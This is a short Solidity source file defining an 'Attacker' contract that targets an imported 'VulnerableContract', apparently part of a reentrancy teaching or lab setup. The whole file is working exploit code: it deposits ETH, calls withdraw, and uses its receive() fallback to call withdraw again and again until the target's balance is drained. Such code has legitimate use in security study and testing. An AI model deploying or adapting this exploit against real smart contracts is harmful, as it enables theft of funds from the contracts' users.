// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {VulnerableContract} from "./VulnerableContract.sol";

contract Attacker {
    VulnerableContract public vulnerableContract;

    constructor(address _vcAddress) {
        vulnerableContract = VulnerableContract(_vcAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vulnerableContract).balance >= msg.value) {
            vulnerableContract.withdraw(msg.value);
        }
    }
}